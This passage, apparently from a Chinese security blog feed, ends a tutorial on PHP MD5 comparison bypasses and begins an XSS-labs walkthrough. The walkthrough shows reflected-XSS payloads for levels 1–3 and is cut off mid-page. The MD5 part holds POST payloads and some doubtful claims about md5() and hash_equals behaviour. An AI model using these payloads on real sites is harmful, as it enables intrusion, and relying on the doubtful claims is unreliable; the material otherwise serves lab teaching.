href="#2-数组绕过（Array-Bypass）" class="headerlink" title="2. 数组绕过（Array Bypass）"></a><strong>2. 数组绕过（Array Bypass）</strong></h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a><strong>原理</strong></h3><p>PHP 的 <code>md5()</code>​ 函数在接收数组时会返回 <code>false</code>​，因此如果 <code>$wqh</code>​ 和 <code>$dsy</code>​ 都是数组，则：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$wqh</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$dsy</span>); <span class="hljs-comment">// false === false → true</span><br></code></pre></td></tr></table></figure><p>但代码中通常会有 <code>$wqh !== $dsy</code>​ 检查，因此需要构造两个不同的数组。</p><h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a><strong>示例</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$wqh</span> = [<span class="hljs-string">&quot;a&quot;</span> =&gt; <span class="hljs-number">1</span>];<br><span class="hljs-variable">$dsy</span> = [<span class="hljs-string">&quot;b&quot;</span> =&gt; <span class="hljs-number">2</span>];<br></code></pre></td></tr></table></figure><ul><li>​<code>md5($wqh)</code>​ 和 <code>md5($dsy)</code>​ 都返回 <code>false</code>​。</li><li>​<code>$wqh !== $dsy</code>​ 成立（因为数组不同）。</li></ul><h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a><strong>攻击方式</strong></h3><p>提交数组：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/target.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><br><span class="language-apache"><span class="hljs-attribute">wqh</span>[]=<span class="hljs-number">1</span>&amp;dsy[]=<span class="hljs-number">2</span></span><br></code></pre></td></tr></table></figure><ul><li>​<code>$_POST[&#39;wqh&#39;]</code>​ 和 <code>$_POST[&#39;dsy&#39;]</code>​ 是不同的数组。</li><li>​<code>md5($_POST[&#39;wqh&#39;]) === md5($_POST[&#39;dsy&#39;])</code>​ 成立（都是 <code>false</code>​）。</li><li>​<code>$_POST[&#39;wqh&#39;] !== $_POST[&#39;dsy&#39;]</code>​ 成立。</li></ul><hr><h2 id="3-特殊字符串绕过（Magic-Hashes）"><a href="#3-特殊字符串绕过（Magic-Hashes）" class="headerlink" title="3. 特殊字符串绕过（Magic Hashes）"></a><strong>3. 特殊字符串绕过（Magic Hashes）</strong></h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a><strong>原理</strong></h3><p>某些字符串的 MD5 哈希值以 <code>0e</code>​ 开头（科学计数法），在 **松散比较（**​ <strong>​<code>==</code>​</strong> ​ <strong>）</strong>  时会被视为 <code>0</code>​，但在 **严格比较（**​ <strong>​<code>===</code>​</strong> ​ <strong>）</strong>  时仍然需要完全匹配。</p><h3 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a><strong>示例</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;s878926199a&quot;</span>; <span class="hljs-comment">// md5: 0e545993274517709034328855841020</span><br><span class="hljs-variable">$b</span> = <span class="hljs-string">&quot;s155964671a&quot;</span>; <span class="hljs-comment">// md5: 0e342768416822451524974117254469</span><br></code></pre></td></tr></table></figure><p>虽然它们的 MD5 都以 <code>0e</code>​ 开头，但严格比较时不会匹配。</p><h3 id="适用情况"><a href="#适用情况" class="headerlink" title="适用情况"></a><strong>适用情况</strong></h3><p>如果代码错误地使用了 <code>==</code>​ 而不是 <code>===</code>​，可以使用这些字符串绕过：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>)) &#123; ... &#125;<br></code></pre></td></tr></table></figure><p>但在严格比较（<code>===</code>​）下无效。</p><hr><h2 id="4-NULL-字节注入（Null-Byte-Injection）"><a href="#4-NULL-字节注入（Null-Byte-Injection）" class="headerlink" title="4. NULL 字节注入（Null Byte Injection）"></a><strong>4. NULL 字节注入（Null Byte Injection）</strong></h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a><strong>原理</strong></h3><p>如果代码在计算 MD5 之前对输入进行了字符串处理（如 <code>trim()</code>​、<code>substr()</code>​），可能会因 NULL 字节（<code>%00</code>​）导致哈希值相同。</p><h3 id="示例-3"><a href="#示例-3" class="headerlink" title="示例"></a><strong>示例</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;abc\00&quot;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-string">&quot;abc&quot;</span>;<br></code></pre></td></tr></table></figure><p>如果代码在计算 MD5 之前去掉了 NULL 字节，则：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$a</span>)) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><h3 id="攻击方式-1"><a href="#攻击方式-1" class="headerlink" title="攻击方式"></a><strong>攻击方式</strong></h3><p>提交：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/target.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><br><span class="language-ini"><span class="hljs-attr">wqh</span>=abc%<span class="hljs-number">00</span>&amp;dsy=abc</span><br></code></pre></td></tr></table></figure><p>如果服务器端代码对输入进行了 <code>trim()</code>​ 或类似处理，可能绕过。</p><hr><h2 id="5-利用-​hash-equals​​-的缺陷"><a href="#5-利用-​hash-equals​​-的缺陷" class="headerlink" title="5. 利用 ​hash_equals​​ 的缺陷"></a><strong>5. 利用</strong> <strong>​<code>hash_equals</code>​</strong>​ <strong>的缺陷</strong></h2><h3 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a><strong>原理</strong></h3><p>如果代码使用 <code>hash_equals(md5($a), md5($b))</code>​，仍然可能被数组绕过：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">hash_equals</span>(<span class="hljs-title function_ invoke__">md5</span>([]), <span class="hljs-title function_ invoke__">md5</span>([])); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><h3 id="攻击方式-2"><a href="#攻击方式-2" class="headerlink" title="攻击方式"></a><strong>攻击方式</strong></h3><p>提交数组：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/target.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><br><span class="language-apache"><span class="hljs-attribute">wqh</span>[]=<span class="hljs-number">1</span>&amp;dsy[]=<span class="hljs-number">2</span></span><br></code></pre></td></tr></table></figure><ul><li>​<code>md5($wqh)</code>​ 和 <code>md5($dsy)</code>​ 都是 <code>false</code>​。</li><li>​<code>hash_equals(false, false)</code>​ 返回 <code>true</code>​。</li></ul><hr><h2 id="6-利用-​-​-​-的严格比较特性"><a href="#6-利用-​-​-​-的严格比较特性" class="headerlink" title="6. 利用  ​===​ ​ 的严格比较特性"></a><strong>6. 利用</strong>  <strong>​<code>===</code>​</strong> ​ <strong>的严格比较特性</strong></h2><h3 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a><strong>原理</strong></h3><p>如果代码逻辑有误，比如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> !== <span class="hljs-variable">$b</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>)) &#123; ... &#125;<br></code></pre></td></tr></table></figure><p>但 <code>md5($a)</code>​ 和 <code>md5($b)</code>​ 必须完全相同，因此 <strong>必须找到真正的 MD5 碰撞</strong>（如方法 1）。</p><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h2><table><thead><tr><th>绕过方式</th><th>适用条件</th><th>示例</th></tr></thead><tbody><tr><td><strong>MD5 碰撞</strong></td><td>严格比较（<code>===</code>​）</td><td>​<code>4dc968ff...</code>​vs<code>4dc968ff...</code>​</td></tr><tr><td><strong>数组绕过</strong></td><td>​<code>md5([]) === false</code>​</td><td>​<code>wqh[]=1&amp;dsy[]=2</code>​</td></tr><tr><td><strong>Magic Hashes</strong></td><td>仅适用于<code>==</code>​</td><td>​<code>s878926199a</code>​vs<code>s155964671a</code>​</td></tr><tr><td><strong>NULL 字节注入</strong></td><td>输入被<code>trim()</code>​处理</td><td>​<code>abc%00</code>​vs<code>abc</code>​</td></tr><tr><td>**<code>hash_equals</code>​绕过**</td><td>使用<code>hash_equals</code>​</td><td>​<code>wqh[]=1&amp;dsy[]=2</code>​</td></tr></tbody></table><h3 id="最佳防御方式"><a href="#最佳防御方式" class="headerlink" title="最佳防御方式"></a><strong>最佳防御方式</strong></h3><ol><li><strong>避免使用 MD5</strong>，改用 <code>SHA-256</code>​ 或 <code>bcrypt</code>​。</li><li><strong>检查输入类型</strong>（<code>is_string()</code>​）。</li><li><strong>禁止数组输入</strong>（<code>is_array()</code>​ 检查）。</li><li><strong>使用</strong> <strong>​<code>hash_equals</code>​</strong>​ <strong>但确保输入是字符串</strong>。</li></ol>]]></content>
    
    
    <categories>
      
      <category>Web安全</category>
      
      <category>PHP安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
      <tag>比较漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSS-labs通关教程</title>
    <link href="/2024/05/20/Web/XSS/XSS-labs%E9%80%9A%E5%85%B3/"/>
    <url>/2024/05/20/Web/XSS/XSS-labs%E9%80%9A%E5%85%B3/</url>
    
    <content type="html"><![CDATA[<h1 id="XSS-labs通关"><a href="#XSS-labs通关" class="headerlink" title="XSS-labs通关"></a>XSS-labs通关</h1><h1 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h1><blockquote><p>查看源码，可以发现<strong>get传参name的值test插入了html里头</strong>，还回显了payload的长度</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level2.php?keyword=test&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level1<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level1<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎用户1<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level1.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:1<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>直接上payload，插入一段js代码，get传参</p><p>​<code>url?name=&lt;script&gt;alert()&lt;/script&gt;</code>​</p><p><strong>源码</strong></p><p><img src="/.com//a82b1fd842e885d5bd9c5df71535c4a8-20250425090536-v8euh4y.png" alt="a82b1fd842e885d5bd9c5df71535c4a8"></p><p>没有啥过滤的，很普通，单纯插入即可</p><p> <strong>本关小结</strong>： JS弹窗函数alert()</p><hr><h1 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level3.php?writing=wait&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level2<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level2<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和test相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">level2.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">GET</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;test&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;搜索&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level2.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:4<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>第一个test可以跟上次一样直接插入js即可，我们先试试看</p><blockquote><p>​<code>&lt;script&gt;alert()&lt;/script&gt;</code>​</p></blockquote><p>没成功，看一下**&#x3D;&#x3D;源码&#x3D;&#x3D;**</p><p><img src="/.com//85e1177ccdebfce885cdb217993301c0-20250425090626-8qa4h50.png" alt="85e1177ccdebfce885cdb217993301c0"></p><p>第一个test进行了html实体转义，但是第二个没有，我们只需要闭合掉双引号即可，构造payload</p><p>​<code>&quot;&gt;  &lt;script&gt;alert()&lt;/script&gt;  &lt;&quot;</code>​</p><p>再看一下&#x3D;&#x3D;源码&#x3D;&#x3D;</p><p><img src="/.com//326771e8135a50d08c8ce3cd9241b048-20250425090714-czc37lt.png" alt="326771e8135a50d08c8ce3cd9241b048"></p><p>果然进行了html实体转化</p><p> <strong>本关小结</strong>：闭合绕过</p><hr><h1 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h1><p>我们先输入123456来查看一下源码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level4.php?keyword=try harder!&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level3<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level3<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和123456相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">level3.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">GET</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;123456&#x27;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">搜索</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level3.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:6<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>相对于上一关，这里是单引号闭合，试一下看看</p><blockquote><p>​<code>&#39;&gt; &lt;script&gt;alert()&lt;/script&gt; &lt;&#39;</code>​</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level4.php?keyword=try harder!&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level3<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level3<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和&#x27;<span class="hljs-symbol">&amp;gt;</span> <span class="hljs-symbol">&amp;lt;</span>script<span class="hljs-symbol">&amp;gt;</span>alert()<span class="hljs-symbol">&amp;lt;</span>/script<span class="hljs-symbol">&amp;gt;</span> <span class="hljs-symbol">&amp;lt;</span>&#x27;相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">level3.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">GET</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;&#x27;</span>&amp;<span class="hljs-attr">gt</span>; &amp;<span class="hljs-attr">lt</span>;<span class="hljs-attr">script</span>&amp;<span class="hljs-attr">gt</span>;<span class="hljs-attr">alert</span>()&amp;<span class="hljs-attr">lt</span>;/<span class="hljs-attr">script</span>&amp;<span class="hljs-attr">gt</span>; &amp;<span class="hljs-attr">lt</span>;&#x27;&#x27;&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">搜索</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level3.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:30<span class="hljs-tag">&lt;/<span 